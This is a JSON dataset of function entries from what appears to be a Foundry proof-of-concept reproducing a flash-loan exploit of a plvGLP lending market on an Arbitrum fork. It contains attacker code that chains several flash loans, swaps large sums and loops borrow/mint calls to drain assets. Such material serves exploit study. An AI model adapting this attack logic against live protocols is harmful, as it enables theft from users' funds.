[
  {
    "contract/interface": "uniswapV3Flash",
    "source_type": "victim_contract",
    "function_name": "flash",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "GlpDepositor",
    "source_type": "victim_contract",
    "function_name": "donate",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "GlpDepositor",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        if (msg.sender == address(AaveFlash)) {\n            USDC.approve(address(AaveFlash), type(uint256).max);\n            WETH.approve(address(AaveFlash), type(uint256).max);\n            DAI.approve(address(AaveFlash), type(uint256).max);\n            address[] memory assets = new address[](1);\n            assets[0] = address(USDC);\n            uint256[] memory amounts = new uint256[](1);\n            amounts[0] = 14_435_000 * 1e6;\n            uint256[] memory modes = new uint256[](1);\n            modes[0] = 0;\n            Radiant.flashLoan(address(this), assets, amounts, modes, address(0), new bytes(1), 0);\n            return true;\n        } else if (msg.sender == address(Radiant)) {\n            USDC.approve(address(Radiant), type(uint256).max);\n            UniV3Flash1.flash(address(this), 5460 * 1e18, 7_170_000 * 1e6, new bytes(1));\n            return true;\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"arbitrum\", 45_121_903);\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(DAI), \"DAI\");\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(FRAX), \"FRAX\");\n        cheats.label(address(sGLP), \"sGLP\");\n        cheats.label(address(MIM), \"MIM\");\n        cheats.label(address(WBTC), \"WBTC\");\n        cheats.label(address(PlvGlpToken), \"PlvGlpToken\");\n        cheats.label(address(AaveFlash), \"AaveFlash\");\n        cheats.label(address(Radiant), \"Radiant\");\n        cheats.label(address(UniV3Flash1), \"UniV3Flash1\");\n        cheats.label(address(UniV3Flash2), \"UniV3Flash2\");\n        cheats.label(address(UniV3Flash3), \"UniV3Flash3\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(Reward), \"Reward\");\n        cheats.label(address(unitroller), \"unitroller\");\n        cheats.label(address(IUSDC), \"IUSDC\");\n        cheats.label(address(lplvGLP), \"lplvGLP\");\n        cheats.label(address(IETH), \"IETH\");\n        cheats.label(address(IMIM), \"IMIM\");\n        cheats.label(address(IUSDT), \"IUSDT\");\n        cheats.label(address(IFRAX), \"IFRAX\");\n        cheats.label(address(IDAI), \"IDAI\");\n        cheats.label(address(IWBTC), \"IWBTC\");\n        cheats.label(address(swapFlashLoan), \"swapFlashLoan\");\n        cheats.label(address(depositor), \"depositor\");\n        cheats.label(GlpManager, \"GlpManager\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        address[] memory assets = new address[](3);\n        assets[0] = address(USDC);\n        assets[1] = address(WETH);\n        assets[2] = address(DAI);\n        uint256[] memory amounts = new uint256[](3);\n        amounts[0] = 17_290_000 * 1e6;\n        amounts[1] = 9500 * 1e18;\n        amounts[2] = 406_316 * 1e18;\n        uint256[] memory modes = new uint256[](3);\n        modes[0] = 0;\n        modes[1] = 0;\n        modes[2] = 0;\n        AaveFlash.flashLoan(address(this), assets, amounts, modes, address(0), \"\", 0);\n\n        emit log_named_decimal_uint(\n            \"Attacker PlvGlpToken balance after exploit\", PlvGlpToken.balanceOf(address(this)), PlvGlpToken.decimals()\n        );\n        console.log(\"Attacker swap all PlvGlpToken to about 4500 ETH\");\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n        emit log_named_decimal_uint(\"Attacker MIM balance after exploit\", MIM.balanceOf(address(this)), MIM.decimals());\n        emit log_named_decimal_uint(\n            \"Attacker FRAX balance after exploit\", FRAX.balanceOf(address(this)), FRAX.decimals()\n        );\n        emit log_named_decimal_uint(\"Attacker DAI balance after exploit\", DAI.balanceOf(address(this)), DAI.decimals());\n        emit log_named_decimal_uint(\n            \"Attacker WBTC balance after exploit\", WBTC.balanceOf(address(this)), WBTC.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV2Call",
    "original_code": "    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external payable {\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        address[] memory path = new address[](2);\n        path[0] = address(WETH);\n        path[1] = address(USDC);\n        Router.swapETHToTokens{value: 14_960 ether}(path, 18_890_000 * 1e6, address(this)); // 14,960 WETH for 19,001,512 USDC\n        USDC.approve(address(IUSDC), USDC.balanceOf(address(this)));\n        IUSDC.mint(USDC.balanceOf(address(this))); // 70M USDC\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(IUSDC);\n        unitroller.enterMarkets(cTokens);\n        uint256 PlvGlpTokenAmount = PlvGlpToken.balanceOf(address(lplvGLP));\n        PlvGlpToken.approve(address(lplvGLP), type(uint256).max);\n        for (uint256 i = 0; i < 16; i++) {\n            lplvGLP.borrow(PlvGlpTokenAmount);\n            lplvGLP.mint(PlvGlpTokenAmount);\n        }\n        lplvGLP.borrow(PlvGlpTokenAmount);\n        deal(address(lplvGLP), address(0), 3_051_070_161 * 1e8); // the exploiter' balance\n        cheats.startPrank(address(0));\n        lplvGLP.transfer(address(this), lplvGLP.balanceOf(address(this)));\n        cheats.stopPrank();\n        UniV3Flash3.flash(address(this), 397_054 * 1e6, 1_609_646 * 1e6, new bytes(1));\n        USDC.transfer(address(Pair), 10_030_500 * 1e6);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {\n        if (msg.sender == address(UniV3Flash1)) {\n            UniV3Flash2.flash(address(this), 0, 2_200_000 * 1e6, new bytes(1));\n            USDC.transfer(address(UniV3Flash1), 7_173_631 * 1e6);\n            USDC.approve(address(Router), 19_012_632 * 1e6);\n            address[] memory path = new address[](2);\n            path[0] = address(USDC);\n            path[1] = address(WETH);\n            Router.swap(path, 19_012_632 * 1e6, 8000 * 1e18, address(this));\n            WETH.transfer(address(UniV3Flash1), 5463 * 1e18);\n        } else if (msg.sender == address(UniV3Flash2)) {\n            Pair.swap(0, 10_000_000 * 1e6, address(this), new bytes(1));\n            USDC.transfer(address(UniV3Flash2), 2_201_111 * 1e6);\n        } else if (msg.sender == address(UniV3Flash3)) {\n            swapFlashLoan.flashLoan(address(this), address(FRAX), 361_037 * 1e18, new bytes(1));\n            USDT.transfer(address(UniV3Flash3), 397_256 * 1e6);\n            USDC.transfer(address(UniV3Flash3), 1_610_460 * 1e6);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "GMXRouter",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(\n        uint8 tokenIndexFrom,\n        uint8 tokenIndexTo,\n        uint256 dx,\n        uint256 minDy,\n        uint256 deadline\n    ) external nonReentrant returns (uint256) {\n        tokens[tokenIndexFrom].safeTransferFrom(msg.sender, address(this), dx);\n        uint256 tokenToAmount = metaSwap.swapUnderlying(\n            tokenIndexFrom,\n            tokenIndexTo,\n            dx,\n            minDy,\n            deadline\n        );\n        tokens[tokenIndexTo].safeTransfer(msg.sender, tokenToAmount);\n        return tokenToAmount;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GMXRouter",
    "source_type": "victim_contract",
    "function_name": "swapETHToTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "GMXReward",
    "source_type": "victim_contract",
    "function_name": "mintAndStakeGlp",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "GMXReward",
    "source_type": "victim_contract",
    "function_name": "mintAndStakeGlpETH",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "SwapFlashLoan",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  }
]